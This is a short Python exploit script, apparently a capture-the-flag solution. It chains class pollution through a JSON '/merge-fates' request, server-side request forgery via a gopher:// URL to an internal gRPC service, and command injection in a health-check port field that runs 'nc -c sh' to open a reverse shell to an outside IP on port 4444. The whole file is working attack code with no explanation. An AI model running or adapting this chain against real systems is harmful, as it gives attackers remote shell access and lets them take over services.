from hyperframe.frame import HeadersFrame, DataFrame, SettingsFrame
from hpack import Encoder
import struct
from urllib.parse import quote
import live_data_pb2
import requests

def create_health_check_request(ip, port):
    request = live_data_pb2.HealthCheckRequest()
    request.ip = ip
    request.port = port
    return request.SerializeToString()

preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
request_payload = create_health_check_request(ip="127.0.0.1", port="$(nc -c sh 37.27.184.43 4444)")

# Add gRPC prefix to the payload (5 bytes)
grpc_payload = struct.pack(">BI", 0, len(request_payload)) + request_payload  # Compression flag + length
# Build HTTP/2 frames
stream_id = 1
encoder = Encoder()
# SETTINGS frame (required for handshake)
settings_frame = SettingsFrame(stream_id=0)
settings = settings_frame.serialize()
# HEADERS frame (with required pseudo-headers)
headers = [
    (":method", "POST"),
    (":path", "/live.LiveDataService/CheckHealth"),
    (":scheme", "http"),
    (":authority", "localhost:50051"),
    ("content-type", "application/grpc"),
    ("te", "trailers"),
]
headers_frame = HeadersFrame(stream_id=stream_id)
headers_frame.data = encoder.encode(headers)
headers_frame.flags.add("END_HEADERS")
headers = headers_frame.serialize()
# DATA frame (gRPC payload)
data_frame = DataFrame(stream_id=stream_id)
data_frame.data = grpc_payload
data_frame.flags.add("END_STREAM")
data = data_frame.serialize()

payload = quote(preface + settings + headers + data)

url = "http://94.237.50.164:49095/"

requests.post(url+"/merge-fates", json={"class": { "superclass": { "realm_url": f"gopher://localhost:50051/_{payload}"}}})

response = requests.get(url+"/connect-realm")
print(response.text)